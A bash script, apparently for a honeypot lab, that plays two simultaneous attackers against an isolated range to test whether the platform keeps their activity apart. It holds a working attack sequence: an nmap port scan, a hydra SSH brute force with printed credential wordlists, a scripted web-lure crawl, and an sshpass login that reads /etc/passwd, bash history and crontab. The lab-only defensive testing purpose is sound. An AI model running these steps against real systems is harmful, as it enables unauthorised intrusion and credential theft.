#!/usr/bin/env bash
# Two attackers at once — LAB ONLY, runs on Kali against the isolated VMnet1 range.
# Tests whether the platform keeps two simultaneous sources apart: attacker A (Kali's own address) runs a loud port scan and an
# SSH brute force; attacker B (a second address on the same Kali interface) follows the web lure, reads the planted SSH
# credential and logs in, while A's connection storm is running. B's honeytoken use must be credited to B, not to A.
# Standard tools only (nmap, hydra, curl, ssh, sshpass), source-bound with each tool's own option (curl --interface, ssh -b).
# Nothing it reads from the honeypots can steer it: it only ever talks to the target host, and the lab-range check below stops it otherwise.
#
# One-time setup on Kali (not persistent; repeat after a reboot):  sudo ip addr add 10.10.10.11/24 dev eth0
# Usage (on Kali):  dual_attacker.sh [--b-delay SEC]
#   --b-delay  seconds attacker B waits after A starts, so B's login lands in the middle of A's traffic (default 25)
# Ground truth (UTC start/end per attacker) goes to $LAB_DUAL_LOG (default ~/dual.jsonl).
set -uo pipefail

TARGET="${LAB_TARGET:-10.10.10.1}"
LAB_PREFIX="${LAB_PREFIX:-10.10.10.}"
WEB_PORT="${LAB_WEB_PORT:-8080}"; SSH_PORT="${LAB_SSH_PORT:-2222}"
SRC2="${LAB_SRC2:-10.10.10.11}"
OUT="${LAB_DUAL_LOG:-$HOME/dual.jsonl}"
B_DELAY=25
while [ $# -gt 0 ]; do
  case "$1" in
    --b-delay) B_DELAY=$2; shift 2 ;;
    *) echo "unknown option $1" >&2; exit 2 ;;
  esac
done
[[ "$B_DELAY" =~ ^[0-9]+$ ]] || { echo "numeric options only" >&2; exit 2; }

now() { date -u +%FT%TZ; }
die() { echo "dual_attacker: $1" >&2; exit 1; }
in_lab() { case "$1" in "$LAB_PREFIX"*) return 0 ;; *) return 1 ;; esac; }
in_lab "$TARGET" || die "target $TARGET is outside the lab range $LAB_PREFIX*"
in_lab "$SRC2" || die "second address $SRC2 is outside the lab range $LAB_PREFIX*"
SRC1=$(ip route get "$TARGET" | grep -o 'src [0-9.]*' | awk '{print $2}')
[ -n "$SRC1" ] || die "cannot work out this machine's address towards $TARGET"
[ "$SRC1" != "$SRC2" ] || die "the second address must differ from $SRC1"
ip -br a | grep -q "$SRC2/" || die "address $SRC2 is not on this machine yet. Run once: sudo ip addr add $SRC2/24 dev eth0"
curl --interface "$SRC2" -s -o /dev/null --max-time 5 "http://$TARGET:$WEB_PORT/" || die "cannot reach $TARGET:$WEB_PORT from $SRC2 (is the lab up?)"

WL=/tmp/dual_wl; mkdir -p "$WL"
printf 'admin\nroot\nuser\ntest\nguest\noracle\nubuntu\npi\nadministrator\nservice\n' > "$WL/users.txt"
printf 'admin\npassword\n123456\nroot\ntoor\nletmein\nqwerty\nwelcome1\nchangeme\nsummer2024\n' > "$WL/pass.txt"
nmap -n -sS -p 1 127.0.0.1 >/dev/null 2>&1 && SYN="-sS" || SYN="-sT"      # SYN scan needs raw sockets (setcap on nmap), else a connect scan

rec() { printf '{"event":"attacker","role":"%s","ip":"%s","scenario":"%s","start":"%s","end":"%s","rc":%s}\n' "$1" "$2" "$3" "$4" "$(now)" "$5" >> "$OUT"; }

attacker_a() {            # Kali's own address: everything loud
  local s; s=$(now)
  nmap -n "$SYN" -p- --min-rate 1000 "$TARGET" >/dev/null 2>&1 &
  sleep 8
  hydra -L "$WL/users.txt" -P "$WL/pass.txt" -s "$SSH_PORT" -t 4 "ssh://$TARGET" >/dev/null 2>&1
  wait
  rec A "$SRC1" "portscan+sshbrute" "$s" 0
}

attacker_b() {            # the second address: a quiet, human-paced walk along the lure
  sleep "$B_DELAY"
  local s rc=0; s=$(now)
  local conf=/tmp/dual_config.bak
  curl --interface "$SRC2" -s "http://$TARGET:$WEB_PORT/robots.txt" -o /dev/null; sleep 2
  curl --interface "$SRC2" -s "http://$TARGET:$WEB_PORT/backup/" -o /dev/null; sleep 2
  curl --interface "$SRC2" -s "http://$TARGET:$WEB_PORT/backup/config.bak" -o "$conf"; sleep 2
  local user pass
  user=$(grep -m1 '^BACKUP_USER=' "$conf" 2>/dev/null | cut -d= -f2-); pass=$(grep -m1 '^BACKUP_PASS=' "$conf" 2>/dev/null | cut -d= -f2-)
  if [ -z "$user" ] || [ -z "$pass" ]; then rec B "$SRC2" "lure_ssh" "$s" 3; return; fi
  local cmds=("whoami" "id" "cat /etc/passwd" "ls -la /home" "cat ~/.bash_history" "cat /etc/hosts" "cat /etc/crontab")
  {
    for c in "${cmds[@]}"; do sleep $((RANDOM % 4 + 2)); printf '%s\n' "$c"; done
    sleep 1; printf 'exit\n'
  } | SSHPASS="$pass" sshpass -e ssh -tt -b "$SRC2" -p "$SSH_PORT" -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=10 "$user@$TARGET" >/dev/null 2>&1 || rc=$?
  rec B "$SRC2" "lure_ssh" "$s" "$rc"
}

: > "$OUT"
printf '{"event":"dual_started","ts":"%s","target":"%s","a":"%s","b":"%s","b_delay":%s}\n' "$(now)" "$TARGET" "$SRC1" "$SRC2" "$B_DELAY" >> "$OUT"
attacker_a & PA=$!
attacker_b & PB=$!
wait "$PA" "$PB"
printf '{"event":"dual_finished","ts":"%s"}\n' "$(now)" >> "$OUT"
